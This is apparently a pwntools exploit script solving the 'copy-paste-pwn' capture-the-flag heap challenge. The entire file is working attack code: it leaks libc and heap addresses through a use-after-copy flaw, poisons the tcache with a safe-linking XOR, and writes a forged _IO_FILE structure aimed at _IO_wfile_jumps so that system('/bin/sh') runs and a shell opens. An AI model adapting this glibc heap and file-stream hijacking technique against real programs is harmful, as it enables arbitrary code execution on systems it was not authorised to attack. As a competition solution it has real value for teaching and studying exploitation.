from pwn import *

p = process('./chall')
# p = remote('copy-paste-pwn.wanictf.org', 9009)
elf = ELF('./chall')
lib = elf.libc


def choice(id_):
    p.recvuntil(b'your choice:')
    p.sendline(id_)


def add(id_, size_, mess):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b':')
    p.send(mess)


def show(id_):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)


def copy(id_):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)


def paste(id_):
    choice(b'4')
    p.recvuntil(b':')
    p.sendline(id_)


def delete(id_):
    choice(b'5')
    p.recvuntil(b':')
    p.sendline(id_)


add(b'0', 0x18, b'a' * 0x18)
add(b'1', 0x420, b'bbb')
add(b'2', 0x20, b'c' * 0x20)
add(b'3', 0x18, b'ddd')
copy(b'1')
delete(b'1')
paste(b'2')
show(b'2')
stdin_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 1104 - 0x20 - 224 - 0x10 - 208
base_addr = stdin_addr - lib.sym['_IO_2_1_stdin_']
print(hex(base_addr))
copy(b'0')
delete(b'0')
paste(b'3')
show(b'3')
p.recvuntil(b'ddd')
key = u64(p.recv(5).ljust(8, b'\00'))
heap_addr = key << 12
print(hex(heap_addr))
add(b'0', 0x3e0, b'aaa')
add(b'0', 0x10, b'a')
add(b'0', 0x10, b'a')
add(b'0', 0x20, b'a')

add(b'0', 0x200, b'a' * 0x1fe + p16(0x71))
add(b'1', 0x208, b'a' * 0x208)
add(b'10', 0x450, b'a')
payload = b'a' * 0x10 + p64(0x70) + p64(0x40)
add(b'9', 0x20, payload)
add(b'11', 0x20, payload)
delete(b'11')
delete(b'10')
copy(b'0')
paste(b'1')
delete(b'9')
add(b'2', 0x60, b'a' * 0x40 + p64(0) + p64(0x31) + p64((base_addr + 0x21a680) ^ (key + 1)))
add(b'3', 0x20, b'a')

system_addr = base_addr + lib.sym["system"]

add(b'3', 0x20, p64(heap_addr + 0x1470))

fake_io_addr = heap_addr + 0x1470  # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE = b'/bin/sh\x00'  # _flags=rdi
fake_IO_FILE += p64(0) * 7
fake_IO_FILE += p64(1) + p64(2)  # rcx!=0(FSOP)
fake_IO_FILE += p64(fake_io_addr + 0xb0)  # _IO_backup_base = rdx
fake_IO_FILE += p64(system_addr)  # _IO_save_end = call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b'\x00')
fake_IO_FILE += p64(heap_addr + 0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, b'\x00')
fake_IO_FILE += p64(fake_io_addr + 0x30)  # _wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, b'\x00')
fake_IO_FILE += p64(1)  # mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, b'\x00')
fake_IO_FILE += p64(base_addr + 0x2160c0 + 0x30)  # vtable = IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(fake_io_addr + 0x40)  # rax2_addr

add(b'10', 0x400, fake_IO_FILE)

# p.sendline(b'6')
# p.sendline(b'cat FLAG')
gdb.attach(p)
# pause()

# delete(b'3')

p.interactive()
